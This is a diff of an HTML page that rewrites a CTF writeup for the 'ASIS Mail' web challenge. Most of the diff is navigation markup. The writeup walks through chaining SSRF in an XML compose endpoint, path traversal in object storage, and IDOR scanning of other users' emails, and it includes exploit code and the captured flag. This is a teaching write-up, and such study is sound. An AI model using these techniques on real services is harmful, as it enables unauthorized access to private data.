@@ -84,7 +84,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#asis-mail-ctf-challenge-writeup" class="md-skip">
+        <a href="#asis-mail-chaining-vulnerabilities" class="md-skip">
           Skip to content
         </a>
       
@@ -572,10 +572,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#challenge-overview" class="md-nav__link">
+  <a href="#the-application" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Challenge Overview
+        The Application
       
     </span>
   </a>
@@ -583,99 +583,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#initial-reconnaissance" class="md-nav__link">
+  <a href="#finding-the-first-vulnerability" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Initial Reconnaissance
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Initial Reconnaissance">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#key-files-structure" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Key Files Structure
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#vulnerability-analysis" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Vulnerability Analysis
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Vulnerability Analysis">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-ssrf-in-compose-endpoint" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        1. SSRF in Compose Endpoint
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2-path-traversal-in-objectstore" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        2. Path Traversal in Objectstore
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#3-hash-endpoint-without-flag-check" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        3. Hash Endpoint Without FLAG Check
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#4-idor-in-email-access" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        4. IDOR in Email Access
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#flag-location" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Flag Location
+        Finding the First Vulnerability
       
     </span>
   </a>
@@ -683,110 +594,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#discovering-the-flag-filename-via-idor" class="md-nav__link">
+  <a href="#the-object-storage-vulnerability" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Discovering the Flag Filename via IDOR
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Discovering the Flag Filename via IDOR">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#scanning-other-users-emails" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Scanning Other Users' Emails
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#analyzing-other-users-attempts" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Analyzing Other Users' Attempts
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#confirming-file-existence-via-hash-endpoint" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Confirming File Existence via Hash Endpoint
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploitation" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Exploitation
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Exploitation">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#step-1-register-and-login" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Step 1: Register and Login
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#step-2-exploit-path-traversal-via-ssrf" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Step 2: Exploit Path Traversal via SSRF
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#step-3-retrieve-the-flag-from-inbox" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Step 3: Retrieve the Flag from Inbox
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#why-the-exploit-works" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Why The Exploit Works
+        The Object Storage Vulnerability
       
     </span>
   </a>
@@ -794,10 +605,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#final-exploit-script" class="md-nav__link">
+  <a href="#finding-the-flag-filename" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Final Exploit Script
+        Finding the Flag Filename
       
     </span>
   </a>
@@ -805,10 +616,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#flag" class="md-nav__link">
+  <a href="#chaining-it-all-together" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Flag
+        Chaining It All Together
       
     </span>
   </a>
@@ -816,10 +627,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#vulnerabilities-summary" class="md-nav__link">
+  <a href="#the-exploit" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Vulnerabilities Summary
+        The Exploit
       
     </span>
   </a>
@@ -827,21 +638,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#lessons-learned" class="md-nav__link">
+  <a href="#what-i-learned" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Lessons Learned
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#tools-used" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Tools Used
+        What I Learned
       
     </span>
   </a>
@@ -946,10 +746,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#challenge-overview" class="md-nav__link">
+  <a href="#the-application" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Challenge Overview
+        The Application
       
     </span>
   </a>
@@ -957,99 +757,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#initial-reconnaissance" class="md-nav__link">
+  <a href="#finding-the-first-vulnerability" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Initial Reconnaissance
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Initial Reconnaissance">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#key-files-structure" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Key Files Structure
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#vulnerability-analysis" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Vulnerability Analysis
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Vulnerability Analysis">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-ssrf-in-compose-endpoint" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        1. SSRF in Compose Endpoint
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2-path-traversal-in-objectstore" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        2. Path Traversal in Objectstore
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#3-hash-endpoint-without-flag-check" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        3. Hash Endpoint Without FLAG Check
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#4-idor-in-email-access" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        4. IDOR in Email Access
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#flag-location" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Flag Location
+        Finding the First Vulnerability
       
     </span>
   </a>
@@ -1057,110 +768,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#discovering-the-flag-filename-via-idor" class="md-nav__link">
+  <a href="#the-object-storage-vulnerability" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Discovering the Flag Filename via IDOR
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Discovering the Flag Filename via IDOR">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#scanning-other-users-emails" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Scanning Other Users' Emails
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#analyzing-other-users-attempts" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Analyzing Other Users' Attempts
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#confirming-file-existence-via-hash-endpoint" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Confirming File Existence via Hash Endpoint
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploitation" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Exploitation
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Exploitation">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#step-1-register-and-login" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Step 1: Register and Login
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#step-2-exploit-path-traversal-via-ssrf" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Step 2: Exploit Path Traversal via SSRF
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#step-3-retrieve-the-flag-from-inbox" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Step 3: Retrieve the Flag from Inbox
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#why-the-exploit-works" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Why The Exploit Works
+        The Object Storage Vulnerability
       
     </span>
   </a>
@@ -1168,10 +779,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#final-exploit-script" class="md-nav__link">
+  <a href="#finding-the-flag-filename" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Final Exploit Script
+        Finding the Flag Filename
       
     </span>
   </a>
@@ -1179,10 +790,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#flag" class="md-nav__link">
+  <a href="#chaining-it-all-together" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Flag
+        Chaining It All Together
       
     </span>
   </a>
@@ -1190,10 +801,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#vulnerabilities-summary" class="md-nav__link">
+  <a href="#the-exploit" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Vulnerabilities Summary
+        The Exploit
       
     </span>
   </a>
@@ -1201,21 +812,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#lessons-learned" class="md-nav__link">
+  <a href="#what-i-learned" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Lessons Learned
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#tools-used" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Tools Used
+        What I Learned
       
     </span>
   </a>
@@ -1255,313 +855,179 @@
   
 
 
-<h1 id="asis-mail-ctf-challenge-writeup">ASIS Mail CTF Challenge Writeup<a class="headerlink" href="#asis-mail-ctf-challenge-writeup" title="Permanent link">&para;</a></h1>
-<h2 id="challenge-overview">Challenge Overview<a class="headerlink" href="#challenge-overview" title="Permanent link">&para;</a></h2>
-<p><strong>Challenge Name:</strong> ASIS Mail
-<strong>Category:</strong> Web
-<strong>Target:</strong> http://91.107.143.167:8081</p>
-<p>ASIS Mail is a web-based email service with multiple microservices including an API server, SSO authentication, object storage, and nginx frontend.</p>
-<h2 id="initial-reconnaissance">Initial Reconnaissance<a class="headerlink" href="#initial-reconnaissance" title="Permanent link">&para;</a></h2>
-<p>The challenge provides source code for analysis. The application architecture consists of:</p>
+<h1 id="asis-mail-chaining-vulnerabilities">ASIS Mail - Chaining Vulnerabilities<a class="headerlink" href="#asis-mail-chaining-vulnerabilities" title="Permanent link">&para;</a></h1>
+<p><strong>Category:</strong> Web
+<strong>Flag:</strong> <code>ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}</code></p>
+<h2 id="the-application">The Application<a class="headerlink" href="#the-application" title="Permanent link">&para;</a></h2>
+<p>ASIS Mail was a microservices-based email application - the kind of architecture that's popular in modern web development. It had multiple services working together: an nginx frontend, a Go API server, a Node.js SSO service, a Python/Flask object storage system, and PostgreSQL for the database.</p>
+<p>The source code was provided, which was helpful. I could see exactly how these services communicated with each other and where the security boundaries were supposed to be.</p>
+<h2 id="finding-the-first-vulnerability">Finding the First Vulnerability<a class="headerlink" href="#finding-the-first-vulnerability" title="Permanent link">&para;</a></h2>
+<p>I started by exploring the API endpoints. The <code>/compose</code> endpoint looked interesting - it accepted XML to create email messages and could fetch attachments from URLs:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nt">&lt;message&gt;</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="nt">&lt;to&gt;</span>myuser@asismail.local<span class="nt">&lt;/to&gt;</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nt">&lt;subject&gt;</span>Test<span class="nt">&lt;/subject&gt;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="nt">&lt;body&gt;</span>test<span class="w"> </span>content<span class="nt">&lt;/body&gt;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="nt">&lt;attachment_url&gt;</span>http://internal-service/path<span class="nt">&lt;/attachment_url&gt;</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nt">&lt;/message&gt;</span>
+</span></code></pre></div>
+<p>This was SSRF - Server-Side Request Forgery. The API would fetch whatever URL I gave it and store the result as an attachment. But I couldn't just point it at <code>http://objectstore:8082/public/FLAG/flag.txt</code> because the object storage had checks for the FLAG bucket.</p>
+<h2 id="the-object-storage-vulnerability">The Object Storage Vulnerability<a class="headerlink" href="#the-object-storage-vulnerability" title="Permanent link">&para;</a></h2>
+<p>Looking at the object storage code, I found something interesting:</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/public/&lt;bucket&gt;/&lt;path:object_name&gt;&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;GET&quot;</span><span class="p">])</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">public_file</span><span class="p">(</span><span class="n">bucket</span><span class="p">,</span> <span class="n">object_name</span><span class="p">):</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>    <span class="k">if</span> <span class="n">bucket</span> <span class="o">==</span> <span class="s2">&quot;FLAG&quot;</span><span class="p">:</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span><span class="s2">&quot;forbidden&quot;</span><span class="p">}),</span> <span class="mi">403</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>    <span class="n">file_path</span> <span class="o">=</span> <span class="n">STORAGE</span> <span class="o">/</span> <span class="n">bucket</span> <span class="o">/</span> <span class="n">object_name</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>    <span class="k">if</span> <span class="ow">not</span> <span class="n">file_path</span><span class="o">.</span><span class="n">exists</span><span class="p">():</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span><span class="s2">&quot;not found&quot;</span><span class="p">}),</span> <span class="mi">404</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></code></pre></div>
+<p>The code checked if the bucket name was "FLAG", but it didn't sanitize the <code>object_name</code> parameter. This meant I could use path traversal with <code>../</code> to escape from my bucket into the FLAG bucket.</p>
+<p>If I used my user ID (let's say 691) as the bucket, then: <code>/public/691/../FLAG/flag-xxx.txt</code> would resolve to <code>/data/FLAG/flag-xxx.txt</code> and bypass the check.</p>
+<h2 id="finding-the-flag-filename">Finding the Flag Filename<a class="headerlink" href="#finding-the-flag-filename" title="Permanent link">&para;</a></h2>
+<p>But there was a problem: I didn't know the exact filename. According to the Dockerfile, the flag was renamed to <code>flag-&lt;md5sum&gt;.txt</code> where the MD5 was computed from the flag content itself.</p>
+<p>That's when I discovered another vulnerability - IDOR (Insecure Direct Object Reference) in the email access endpoint. I could read ANY user's email by just changing the email ID:</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">for</span> <span class="n">email_id</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">800</span><span class="p">):</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/mail/</span><span class="si">{</span><span class="n">email_id</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    <span class="c1"># Check for attachments with flag filenames</span>
+</span></code></pre></div>
+<p>By scanning other users' emails, I found they had tried various flag filenames. The most common one appearing was <code>flag-0750c96cfc2bd4b665865da15e9d5b94.txt</code>. Other competitors had obviously found the filename somehow.</p>
+<p>I verified it existed using the hash endpoint (which didn't have the FLAG check):</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>GET /files/public/x/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt/hash
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Response: {&quot;content&quot;:&quot;a69e461b31f79128...&quot;,&quot;status&quot;:&quot;ok&quot;}
+</span></code></pre></div>
+<p>Perfect. The file existed.</p>
+<h2 id="chaining-it-all-together">Chaining It All Together<a class="headerlink" href="#chaining-it-all-together" title="Permanent link">&para;</a></h2>
+<p>Now I had all the pieces:
+1. SSRF in the compose endpoint
+2. Path traversal in object storage
+3. The correct flag filename</p>
+<p>I registered a new account and used the compose endpoint to fetch the flag via SSRF:</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">username</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;exploit_</span><span class="si">{</span><span class="n">random_string</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/sso/register&quot;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/sso/login&quot;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">user_id</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="p">{})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;userId&quot;</span><span class="p">)</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="c1"># Use path traversal with my own user ID as the bucket</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="n">ssrf_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;http://objectstore:8082/public/</span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt&quot;</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="n">xml</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;&lt;message&gt;</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="s1">    &lt;to&gt;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s1">@asismail.local&lt;/to&gt;</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="s1">    &lt;subject&gt;GetFlag&lt;/subject&gt;</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="s1">    &lt;body&gt;flag&lt;/body&gt;</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="s1">    &lt;attachment_url&gt;</span><span class="si">{</span><span class="n">ssrf_url</span><span class="si">}</span><span class="s1">&lt;/attachment_url&gt;</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="s1">&lt;/message&gt;&#39;&#39;&#39;</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/compose&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;xml&quot;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">xml</span><span class="p">)})</span>
+</span></code></pre></div>
+<p>The API made the request internally (bypassing nginx restrictions), the path traversal worked, and the flag was stored as an attachment in my inbox. I retrieved it from my email:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}
+</span></code></pre></div>
+<h2 id="the-exploit">The Exploit<a class="headerlink" href="#the-exploit" title="Permanent link">&para;</a></h2>
+<p>Here's the complete exploit:</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="ch">#!/usr/bin/env python3</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="n">BASE_URL</span> <span class="o">=</span> <span class="s2">&quot;http://91.107.143.167:8081&quot;</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="n">FLAG_FILENAME</span> <span class="o">=</span> <span class="s2">&quot;flag-0750c96cfc2bd4b665865da15e9d5b94.txt&quot;</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="k">def</span><span class="w"> </span><span class="nf">random_string</span><span class="p">(</span><span class="n">length</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="n">length</span><span class="p">))</span>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>    <span class="c1"># Register and login</span>
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>    <span class="n">username</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;exploit_</span><span class="si">{</span><span class="n">random_string</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>    <span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;ExploitPass123!&quot;</span>
+</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>
